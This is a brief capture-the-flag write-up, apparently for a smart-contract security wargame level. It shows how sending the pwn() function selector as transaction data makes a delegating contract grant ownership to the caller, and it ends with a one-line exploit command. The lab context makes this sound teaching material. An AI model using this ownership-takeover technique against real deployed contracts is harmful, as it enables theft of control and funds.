To solve this lvl we need to pass pwn() function indetifier as data in sendTransaction(). Contract will call pwn() and claim us ownership

Keecak256 of `pwn()`: `dd365b8b15d5d78ec041b851b68c8b985bee78bee0b87c4acf261024d8beabab`. 

```
await contract.sendTransaction({data: '0xdd365b8b'})
```
